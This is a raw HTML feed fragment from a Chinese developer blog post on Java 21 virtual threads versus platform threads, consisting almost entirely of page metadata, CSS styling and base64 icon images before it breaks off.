</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 21è™šæ‹Ÿçº¿ç¨‹ä¸å¹³å°çº¿ç¨‹ï¼šJVMå±‚é¢çš„æ·±åº¦å¯¹æ¯”ä¸å®ç°åŸç†]]></title>    <link>https://juejin.cn/post/7582787460419371050</link>    <guid>https://juejin.cn/post/7582787460419371050</guid>    <pubDate>2025-12-13T06:06:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582787460419371050" data-draft-id="7582813955212820521" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 21è™šæ‹Ÿçº¿ç¨‹ä¸å¹³å°çº¿ç¨‹ï¼šJVMå±‚é¢çš„æ·±åº¦å¯¹æ¯”ä¸å®ç°åŸç†"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-13T06:06:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 21è™šæ‹Ÿçº¿ç¨‹ä¸å¹³å°çº¿ç¨‹ï¼šJVMå±‚é¢çš„æ·±åº¦å¯¹æ¯”ä¸å®ç°åŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T06:06:43.000Z" title="Sat Dec 13 2025 06:06:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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